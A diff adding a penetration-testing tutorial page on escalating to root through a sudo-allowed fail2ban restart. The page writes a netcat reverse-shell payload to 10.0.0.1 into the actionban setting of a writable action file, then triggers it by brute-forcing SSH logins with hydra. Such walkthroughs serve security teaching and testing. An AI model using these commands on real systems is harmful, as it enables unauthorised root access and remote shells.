@@ -1,0 +1,115 @@
+---
+title: Sudo Fail2ban Privilege Escalation
+description: Sudo fail2ban command might be vulnerable to privilege escalation (PrivEsc).
+tags:
+    - Privilege Escalation
+refs:
+date: 2023-02-05
+draft: false
+---
+
+**Fail2ban** is an intrusion prevention software framework.  
+It prevents against brute force attacks.  
+
+## Investigation
+
+```sh
+sudo -l
+
+(root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+
+If we can execute **"fail2ban"** as root, we can gain access to privileges by modifying the configuration file.  
+We need to check if the config file is writable.
+
+```sh
+find /etc -writable -ls 2>/dev/null
+
+4 drwxrwx--- 2 root security  4096 Oct 16 08:57 /etc/fail2ban/action.d
+```
+
+Look inside of **"/etc/fail2ban/jail.conf"** to know more about how fail2ban is configured.
+
+```sh
+less /etc/fail2ban/jail.conf
+
+# ---------------------------------------------
+
+# output
+
+...
+# "bantime" is the number of seconds that a host is banned.
+bantime  = 10s
+
+# A host is banned if it has generated "maxretry" during the last "findtime"
+# seconds.
+findtime  = 10s
+
+# "maxretry" is the number of failures before a host get banned.
+maxretry = 5
+...
+```
+
+<br />
+
+## Exploitation
+
+### 1. Modify the Configuration File
+
+For privilege escalation, we need to update the **"iptables-multiport.conf"**.  
+Specifically, insert a payload to one of the following values.
+
+- **actionstart**
+- **actionstop**
+- **actioncheck**
+- **actionban**
+- **actionunban**
+
+Here update the value of **actionban** which triggers ban on multiple login attempts.  
+Copy  **iptables-multiport.conf** to the current user's home directory.
+
+```sh
+ls -al /etc/fail2ban/action.d/iptables-multiport.conf
+# copy this file into the home directory for editing the content
+cp /etc/fail2ban/action.d/iptables-multiport.conf ~
+```
+Now modify the file.
+
+```sh
+vim ~/iptables-multiport.conf
+```
+
+We insert a reverse shell payload into the **actionban**.
+
+```sh
+actionban = /usr/bin/nc 10.0.0.1 4444 -e /bin/bash
+```
+
+Then move back the config file to the original one.
+
+```sh
+mv ~/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
+```
+
+To apply the new configuration, restart it as root.
+
+```sh
+sudo /etc/init.d/fail2ban restart
+```
+
+### 2. Trigger the Action
+
+Start a listener in local machine.
+
+```sh
+nc -lvnp 4444
+```
+
+Try to login with the wrong passwords multiple times until we will get banned.  
+So that to, **hydra** is useful.
+
+```sh
+hydra -l root -P passwords.txt <target-ip> ssh
+```
+
+After a short time, you will get a root shell via listener.
